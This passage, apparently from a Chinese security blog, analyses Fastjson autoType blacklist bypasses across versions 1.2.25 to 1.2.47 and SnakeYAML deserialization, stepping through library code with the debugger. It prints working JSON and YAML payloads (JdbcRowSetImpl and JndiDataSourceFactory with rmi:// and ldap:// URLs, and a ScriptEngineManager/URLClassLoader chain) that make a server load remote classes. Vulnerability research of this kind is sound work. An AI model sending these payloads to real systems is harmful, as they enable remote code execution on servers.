class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -&gt; "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token class-name">String</span> accept<span class="token punctuation">;</span>                    <span class="token keyword">int</span> i<span class="token punctuation">;</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        accept <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        accept <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -&gt; "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">DataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -&gt; "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h3><p>autoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。</p><p>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p><ul><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li></ul><p>AutoType白名单设置方法：</p><ol><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept("com.xx.a");</code></li><li>通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li></ol><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>前提条件：需要autoTypeSupport开启。</p><p>EXP</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span><span class="token punctuation">,</span><span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1089/Evi"</span><span class="token punctuation">,</span><span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分析：</p><p>一路调试来到checkAutoType方法，会先进行白名单校验后进行黑名单校验，由于Lcom.sun.rowset.JdbcRowSetImpl;类并不在黑名单中，所以会来到TypeUtils.loadClass()方法中，此后面和之前的流程一样了。</p><img src="/fastjson/18.png" class=""><p>漏洞点就在于此处会对以L开头和;结尾的类进行处理，即去掉L和；后再执行loadClass()方法，此方法后面的流程和前面版本的流程一致，所以可以产生漏洞。</p><img src="/fastjson/19.png" class=""><h2 id="1-2-25-lt-Fastjson-lt-1-2-42绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-42绕过" class="headerlink" title="1.2.25<=Fastjson<=1.2.42绕过"></a>1.2.25&lt;=Fastjson&lt;=1.2.42绕过</h2><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p><p>EXP</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span><span class="token punctuation">,</span><span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1089/Evi"</span><span class="token punctuation">,</span><span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此处多了一部分校验类是否以L开头以；结尾，若是则除去L和;（写个过滤也用hash异或，搞这么复杂！！！）。后面的执行流程和前面一样，所以可以使用双写L和；进行绕过。</p><img src="/fastjson/20.png" class=""><h2 id="1-2-25-lt-Fastjson-lt-1-2-43绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-43绕过" class="headerlink" title="1.2.25<=Fastjson<=1.2.43绕过"></a>1.2.25&lt;=Fastjson&lt;=1.2.43绕过</h2><p>EXP </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"[com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token punctuation">,</span><span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1089/Evi"</span><span class="token punctuation">,</span><span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上一个版本的修复，此处如果类名以LL开头则直接报错退出程序。</p><img src="/fastjson/22.png" class=""><p>接着来到TypeUtils.loadClass()方法。此如果类名以[开头则提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类</p><img src="/fastjson/21.png" class=""><p>此处返回的类名是[com.sun.rowset.JdbcRowSetImpl，会通过checkAutoType()函数的检测，后面会来到反序列化部分。</p><p>在反序列化中，调用了<code>DefaultJSONParser.parseArray()</code>函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”<code>[</code>“、”<code>{</code>“等。满足这些条件后得到最终的payload。</p><img src="/fastjson/23.png" class=""><h2 id="1-2-25-lt-Fastjson-lt-1-2-45绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-45绕过" class="headerlink" title="1.2.25<=Fastjson<=1.2.45绕过"></a>1.2.25&lt;=Fastjson&lt;=1.2.45绕过</h2><p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p><p>EXP</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">,</span><span class="token string">"properties"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string">"data_source"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处主要是绕过黑名单，因为黑名单中不包括org.apache.ibatis.datasource.jndi.JndiDataSourceFactory类</p><p>1.2.46版本修复则是直接把此类加入黑名单中。</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr></tbody></table><p>此处对上一个版本的修复则是，当类以[开头则直接报错退出程序。</p><img src="/fastjson/24.png" class=""><p>直接查看org.apache.ibatis.datasource.jndi.JndiDataSourceFactory类的setProperties()方法。</p><p>此处满足fastjson反序列化时自动调用的setter方法。方法中明显是jndi注入的入口。</p><p>其中参数由我们输入的properties属性中的data_source值获取的。</p><p>之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。</p><img src="/fastjson/25.png" class=""><h2 id="1-2-25-lt-Fastjson-lt-1-2-47绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-47绕过" class="headerlink" title="1.2.25<=Fastjson<=1.2.47绕过"></a>1.2.25&lt;=Fastjson&lt;=1.2.47绕过</h2><p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li></ul><p>EXP</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span>    <span class="token string">"a"</span><span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>        <span class="token string">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">"b"</span><span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>        <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span>        <span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>不受AutoTypeSupport影响版本（1.2.33-1.2.47）</li></ul><p>在第一次解析中，进入checkAutoType()函数后，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；来到TypeUtils.getClassFromMapping方法中。</p><img src="/fastjson/28.png" class=""><p>TypeUtils.getClassFromMapping方法是在mappings中找键为className的值，此处mapping中并没有java.lang.class，所以此处返回Null。</p><img src="/fastjson/29.png" class=""><p>接着会来到this.deserializers.findClass方法中。</p><img src="/fastjson/30.png" class=""><p>findClass中逻辑是，在buckets中寻找keyString键的值，如果找到则返回类对象，此处java.lang.class类在此表中，所以会返回此类对象。</p><img src="/fastjson/31.png" class=""><p>继续往下走，可知此处返回 java.lang.class类对象，所以第一次checkAutoType通过且返回Class类对象。</p><img src="/fastjson/32.png" class=""><p>一路调试来到eserializer.deserialze方法中。直到此处，if判断语句中需要值为val,且将val中的值赋给objVal，后面会将objVal以String形式赋值给strVal。</p><img src="/fastjson/33.png" class=""><p>最后会来到TypeUtils.loadClass中加载com.sun.rowset.JdbcRowSetImpl类。</p><img src="/fastjson/34.png" class=""><p>跟踪TypeUtils.loadClass方法会来到此处，默认是开启缓存的，所以此处会将com.sun.rowset.JdbcRowSetImpl类加载到mappings中，</p><p>这样第二次执行@type为com.sun.rowset.JdbcRowSetImpl时则会绕过checkAutoType达到漏洞效果。第二次执行流程类似就不详细讲了。</p><img src="/fastjson/35.png" class=""><img src="/fastjson/36.png" class=""><ul><li>受AutoTypeSupport影响版本（1.2.25-1.2.32）</li></ul><p>关键点在于，高版本的if判断多了一个&amp;&amp;TypeUtils.getClassFromMapping(typeName) == null，所以低版本的反而开启autotypesupport则无法进行利用。</p><img src="/fastjson/37.png" class=""><img src="/fastjson/38.png" class=""><p>参考链接: [<a href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%A6%82%E4%BD%95%E5%85%B3%E8%81%94-outputProperties%E4%B8%8EgetOutputProperties-%E6%96%B9%E6%B3%95]">https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%A6%82%E4%BD%95%E5%85%B3%E8%81%94-outputProperties%E4%B8%8EgetOutputProperties-%E6%96%B9%E6%B3%95]</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>snakeYaml反序列化漏洞分析</title>
      <link href="/snakeyaml/"/>
      <url>/snakeyaml/</url>
      
        <content type="html"><![CDATA[<h1 id="Yaml基础知识"><a href="#Yaml基础知识" class="headerlink" title="Yaml基础知识"></a><em>Yaml基础知识</em></h1><p>基本语法：</p><ul><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>缩进不允许使用tab，只允许空格</li><li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li><li>‘#’表示注释</li></ul><p>数据结构：</p><ul><li><p>对象</p><p>使用冒号代表，格式为 key: value。冒号后面需要加空格：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">key</span><span class="token punctuation">:</span>     <span class="token key atrule">key_child01</span><span class="token punctuation">:</span> value    <span class="token key atrule">key_child02</span><span class="token punctuation">:</span> value    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>数组</p><p>使用<code>-</code>后面加空格代表一个数组项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">shuzhu</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> One      <span class="token punctuation">-</span> Two      <span class="token punctuation">-</span> Three      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>常量</p><p>提供多种常量结构，包括：整数、浮点数、字符串、NULL、日期、布尔、时间：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">boolean</span><span class="token punctuation">:</span>     <span class="token punctuation">-</span> <span class="token boolean important">TRUE</span>  <span class="token comment">#true,True都可以</span>    <span class="token punctuation">-</span> <span class="token boolean important">FALSE</span>  <span class="token comment">#false，False都可以</span><span class="token key atrule">float</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token number">3.14</span>    <span class="token punctuation">-</span> <span class="token number">6.8523015e+5</span>  <span class="token comment">#可以使用科学计数法</span><span class="token key atrule">int</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token number">123</span>    <span class="token punctuation">-</span> 0b1010_0111_0100_1010_1110    <span class="token comment">#二进制表示</span><span class="token key atrule">null</span><span class="token punctuation">:</span>    <span class="token key atrule">nodeName</span><span class="token punctuation">:</span> <span class="token string">'node'</span>    <span class="token key atrule">parent</span><span class="token punctuation">:</span> <span class="token null important">~</span>  <span class="token comment">#使用~表示null</span><span class="token key atrule">string</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> 哈哈    <span class="token punctuation">-</span> <span class="token string">'Hello world'</span>  <span class="token comment">#可以使用双引号或者单引号包裹特殊字符</span>    <span class="token punctuation">-</span> newline      newline2    <span class="token comment">#字符串可以拆成多行，每一行会被转化成一个空格</span><span class="token key atrule">date</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token datetime number">2023-02-02</span>    <span class="token comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span><span class="token key atrule">datetime</span><span class="token punctuation">:</span>     <span class="token punctuation">-</span>  <span class="token datetime number">2023-02-02T15:02:31+08:00</span>    <span class="token comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>yml文件转yaml字符串在线工具：<a href="https://www.345tool.com/zh-hans/formatter/yaml-formatter">https://www.345tool.com/zh-hans/formatter/yaml-formatter</a></p></li></ul><h1 id="SnakeYmal基本使用"><a href="#SnakeYmal基本使用" class="headerlink" title="SnakeYmal基本使用"></a><em>SnakeYmal基本使用</em></h1><p>添加依赖包：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.yaml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>snakeyaml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.33<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Yaml.dump(): 将java对象序列化为yaml字符串。</li><li>Yaml.load(): 将输入的yaml形式的字符串或者文件反序列化为java对象。</li></ul><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a><em>序列化</em></h2><p>Student类：</p><img src="/snakeyaml/01.png" class=""><p>对Student类进行序列化：</p><img src="/snakeyaml/02.png" class=""><p>得到序列化字符串值  !!cn.red6380.Student {age: 13, name: red6380}</p><p>!!后接被序列化的全类名，类似于fastjson中的@type</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><em>反序列化</em></h2><img src="/snakeyaml/04.png" class=""><p>load和loadas进行反序列化时会调用相应的setter方法(pubilc修饰的属性不会调用setter方法)，由于loadAs反序列时需指定类，所以入参直接指定参数值即可。</p><h1 id="SnakeYmal反序列化漏洞分析"><a href="#SnakeYmal反序列化漏洞分析" class="headerlink" title="SnakeYmal反序列化漏洞分析"></a><em>SnakeYmal反序列化漏洞分析</em></h1><p>影响版本：全版本</p><p>POC（  [  前注意有空格，否则无法执行）</p><pre class="line-numbers language-none"><code class="language-none">!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:9999"]]]]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>EXP</p><p><a href="https://github.com/artsploit/yaml-payload/">https://github.com/artsploit/yaml-payload/</a>：参考此处的payload进行攻击。</p><p>此处用到了SPI机制。</p><p>Java SPI机制全称为Service Provider Interface, 即服务提供发现机制。</p><p>当服务的提供者提供了一种接口的实现之后, 需要在classpath下 <code>META-INF/services</code>目录里创建一个以服务接口命名的文件, 文件内容为接口的具体实现类。当其他客户端程序需要这个服务的时候, 就可以通过查找 <code>META-INF/services</code>中的配置文件去加载对应的实现类。</p><p>漏洞分析：</p><p>在yaml.load()处打断点进行调试。</p><img src="/snakeyaml/07.png" class=""><p>进入load函数中，先把入参转变成StreamReader对象后再执行loadFromReader方法，继续跟进。</p><p>loadFromReader方法前面两行代码只是进行常规的赋值操作，直接跟进getSingleDate方法。</p><img src="/snakeyaml/08.png" class=""><p>首先将payload使用getSingleNode方法进行一些转换成为Node对象，!!转变为tag:yaml.org,2002:是在此处方法中进行的，然后直接跳过判断语句进入constructDocument方法，继续跟进。</p><img src="/snakeyaml/11.png" class=""><p>继续跟进constructObject方法。</p><img src="/snakeyaml/12.png" class=""><p>一直跟进，直到constructor.construct方法，继续跟进。</p><img src="/snakeyaml/15.png" class=""><p>construct——&gt;getConstructor——&gt;getClassForNode——&gt;getClassForName，可知在此方法中使用Class.forName对javax.script.ScriptEngineManager类进行加载。之后依次会对java.net.URLClassLoader、java.net.URL类使用相同的方式进行加载。</p><img src="/snakeyaml/16.png" class=""><p>依次加载类后，会进入类的实例化，实例化顺序为java.net.URL、java.net.URLClassLoader、javax.script.ScriptEngineManager，一层一层将前面实例化的对象作为下一个类实例时的入参。</p><img src="/snakeyaml/18.png" class=""><p>命令触发是在javax.script.ScriptEngineManager类实例时，所以跟进ScriptEngineManager的构造函数。</p><p>构造函数调用了init方法，跟进此方法，前面是实例化一些类，直接跟进initEngines方法。</p><img src="/snakeyaml/19.png" class=""><p>跟进getServiceLoader方法。最后返回的是ServiceLoader实例。</p><img src="/snakeyaml/20.png" class=""><img src="/snakeyaml/21.png" class=""><img src="/snakeyaml/22.png" class=""><p>此处返回结果，继续跟进来到了while循环。</p><img src="/snakeyaml/23.png" class=""><p>跟进hashNext方法。最后来到hasNextService方法，这里去获取META-INF/services/javax.script.ScriptEngineFactory类信息，最后返回true。</p><img src="/snakeyaml/24.png" class=""><img src="/snakeyaml/25.png" class=""><img src="/snakeyaml/26.png" class=""><p>继续跟进,来到while循环中的itr.next方法。</p><img src="/snakeyaml/27.png" class=""><img src="/snakeyaml/28.png" class=""><img src="/snakeyaml/29.png" class=""><img src="/snakeyaml/30.png" class=""><p>来到了nextService方法，先加载类再实例。可看出第一次实例化的类是NashornScriptEngineFactory。</p><img src="/snakeyaml/31.png" class=""><p>调试可知while循环体需执行两次，第一次实例化的是ScriptEngineFactory，第二次才是POC类</p><p>第二次实例化执行命令成功。</p><img src="/snakeyaml/32.png" class=""><h1 id="入参部分可控"><a href="#入参部分可控" class="headerlink" title="入参部分可控"></a>入参部分可控</h1><p>在实际情况中yaml.load的入参可能只是yaml文件中的一部分，此时是否也可以进行反序列化呢？</p><p>本地创建一个yml文件进行测试。D://setting.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">config</span><span class="token punctuation">:</span>   <span class="token key atrule">secret</span><span class="token punctuation">:</span> <span class="token number">1860437896</span>  <span class="token key atrule">number</span><span class="token punctuation">:</span> <span class="token number">11111</span>  <span class="token key atrule">nacos</span><span class="token punctuation">:</span>    <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> 127.0.0.1<span class="token punctuation">:</span><span class="token number">8848</span>    <span class="token key 